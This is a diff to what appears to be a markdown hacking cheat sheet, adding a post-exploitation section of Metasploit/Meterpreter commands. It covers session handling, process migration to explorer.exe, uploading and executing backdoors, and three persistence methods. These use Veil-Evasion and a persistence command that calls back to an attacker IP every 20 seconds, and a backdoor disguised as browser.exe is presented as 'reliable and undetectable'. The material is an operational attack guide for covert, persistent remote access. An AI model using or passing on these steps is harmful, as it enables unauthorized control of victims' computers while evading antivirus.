@@ -620,18 +620,101 @@ Change DMZ address to hackers ip address.
 
 # Post Exploitation
 
+### Meterpreter basics
 
+After getting a meterpreter session you can run the session in the background so that you can run other exploits
+`meterpreter> background`
 
+Show a list with all the current sessions
+`meterpreter> sessions -l` 
 
+Interact with a meterpreter session running in the background
+`kali@root> sessions -i 2`  
 
+Show the system information
+`meterpreter> sysinfo`
 
+Show the network interfaces of the target computer
+`meterpreter> ipconfig`
 
+Show all the processes running on the computer
+`meterpreter> ps`
 
+Migrate to another proces running on the target computer,
+safest thing to do is migrate to explorer.exe because this is the GUI of the target computer. 
+If you don't do this, and the target closes your backdoor or program running, you will be disconnected.
+`meterpreter> migrate 2116` (2116 is the process id for example of explorer.exe)
 
+Get current working directory
+`meterpreter> pwd`
 
+List all files and directories
+`meterpreter> ls`
 
+Read a file
+`meterpreter> cat text.txt`
 
+Download a file
+`meterpreter> download text.txt`
 
+Upload a file (mostly a backdoor,virus,...)
+`meterpreter> upload file.exe`
+
+Execute a file
+`meterpreter> execute -f file.exe`
+
+Use a windows command prompt
+`meterpreter> shell`
+
+### Maintaining Access 
+
+#### Method 1: using a veil-evasion (does not always work)
+
+Use a rev_http_service instead of the normal backdoor used to connect to the target
+Set a veil http service als upload it to the target computer
+```
+> veil-evasion
+> list
+> use 5
+Set up the rest
+```
+
+#### Method 2: using persistence module in meterpreter (Detectable by antivirus programs)
+`meterpreter> run persistence -h` (to show the options)
+`meterpreter> run persistence -U -i 20 -p 80 -r 10.20.14.203`
+-U to run it under user privileges, when the user logs on
+-i is trying to connect back to the hacker every 20 seconds in this case
+-p port 80 is used to connect
+-r is the ip address where the service tries to connect with
+
+#### Method 3: Reliable and undetectable (metasploit + veil)
+
+Background the existing meterpreter session
+`meterpreter> background`
+
+Use a persistence exploit in metasploit
+```
+msf exploit(handler)> use exploit/windows/local/persistence
+msf exploit(persistence)> show options
+```
+DELAY: amount of time to keep reconnecting back
+EXE_NAME: filename used on the target host in the processes
+`> set EXE_NAME browser.exe`
+SESSION: which session to run the exploit aan
+controlleer eerst de running sessions: `> sessions -l`
+`> set SESSION 1`
+##### Show advanced options for this module
+`> show advanced`
+
+`set EXE::Custom /var/www/html/backdoor.exe`
+
+Upload the exploit to session 1
+`exploit`
+
+When you kill the running meterpreter sessions (`sessions -K`)
+and the target pc reboots, so no more connections remaining, and you 
+use exploit/multi/handler to listen to the port specified in the backdoor you uploaded.
+##### YOU ALWAYS WILL GET A CONNECTION!!!!
 
 
 
